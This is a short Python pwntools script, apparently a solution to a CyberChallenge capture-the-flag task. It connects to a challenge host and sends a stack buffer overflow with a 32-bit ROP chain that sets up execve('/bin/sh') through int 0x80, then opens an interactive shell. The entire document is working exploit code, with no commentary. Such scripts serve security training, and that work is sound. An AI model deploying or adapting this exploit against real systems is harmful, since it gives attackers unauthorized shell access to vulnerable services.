from pwn import *

exe = ELF("/home/alessio/Scrivania/tools/CTFs/CyberChallenge/Week 10/1-primality_test/primality_test" )
context.binary = exe
HOST = "roptest.challs.cyberchallenge.it"
PORT = 6010
p = remote(HOST, PORT)

print("[+] Exploiting...")
POP_EAX_INT = 0x08048606
POP_EBX_ECX = 0x08048609
POP_ECX = 0x0804860a
POP_EDX = 0x0804860c
BIN_SH = next(exe.search(b'/bin/sh\x00'))
chain = (
        b'a' * (0x4c + 4) +
        p32(POP_EBX_ECX) +
        p32(BIN_SH) +
        p32(0) +
        p32(POP_EDX) +
        p32(0)+
        p32(POP_EAX_INT) +
        p32(11)
)
p.sendlineafter("Enter a number: ", chain)
p.interactive()
